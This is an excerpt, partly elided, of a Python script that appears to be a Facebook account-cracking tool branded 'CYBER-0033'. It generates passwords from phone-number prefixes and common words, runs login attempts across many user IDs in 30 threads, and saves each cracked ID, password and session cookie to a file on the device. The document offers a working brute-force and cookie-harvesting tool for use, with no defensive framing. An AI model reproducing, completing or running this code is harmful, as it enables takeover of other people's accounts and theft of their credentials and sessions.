...
logo =("""                                                
\x1b[38;5;46m                                   ,...             
\x1b[38;5;46m .o88b. db    db d8888b. d88888b d8888b. 
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mCYBER-0033
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46m𝐇𝐞𝐥𝐥𝐨 𝐇𝐚𝐜𝐤𝐞𝐫,𝐬 𝟎.𝟐
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m2.4
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mNOTE  \033[1;32m    ● CP REMOVE TOOL
...
def v2():
    ...
    with ThreadPool(max_workers=30) as akash:
        ...
        for guru in user:
            ...
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'jannat','sadia','i love u']
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sCYBER•😘😍\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SK-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#                print(f"\x1b[38;5;190m[CYBER-CP😔] {uid}|{ps}")
